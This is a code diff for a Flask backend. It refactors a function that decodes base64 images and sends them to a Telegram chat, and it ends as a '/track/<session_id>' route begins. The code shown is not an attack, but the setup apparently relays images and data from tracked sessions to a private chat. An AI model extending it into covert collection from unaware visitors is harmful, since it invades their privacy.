@@ -1,6 +1,8 @@
 import os
 import json
 import requests
+import base64
+from io import BytesIO
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 
@@ -21,25 +23,22 @@ def send_telegram_message(text):
     payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
     requests.post(TELEGRAM_API, json=payload)
 
-import base64
-from io import BytesIO
-
 def send_telegram_photo(photo_base64, caption):
-    """Decode Base64 and send image as a file to Telegram."""
+    """Convert Base64 to file and send image to Telegram."""
     try:
-        # Decode Base64 image
-        image_data = base64.b64decode(photo_base64.split(",")[1])  # Remove header data
-        files = {'photo': ('image.png', BytesIO(image_data), 'image/png')}
-        payload = {"chat_id": CHAT_ID, "caption": caption}
+        # Convert Base64 to an image file
+        photo_data = base64.b64decode(photo_base64.split(',')[1])  # Remove 'data:image/png;base64,' part
+        image_file = BytesIO(photo_data)
 
-        response = requests.post(TELEGRAM_PHOTO_API, data=payload, files=files)
-        print(response.json())  # Debugging
+        # Send image to Telegram
+        files = {"photo": ("photo.png", image_file, "image/png")}
+        data = {"chat_id": CHAT_ID, "caption": caption}
+        response = requests.post(TELEGRAM_PHOTO_API, files=files, data=data)
+
+        print("Telegram Response:", response.text)
+
     except Exception as e:
-        print(f"Error sending photo: {e}")
-
-@app.route('/')
-def home():
-    return "Flask backend is live!"
+        print("Error sending photo:", e)
 
 @app.route('/track/<session_id>', methods=['POST', 'OPTIONS'])
 def track_device(session_id):
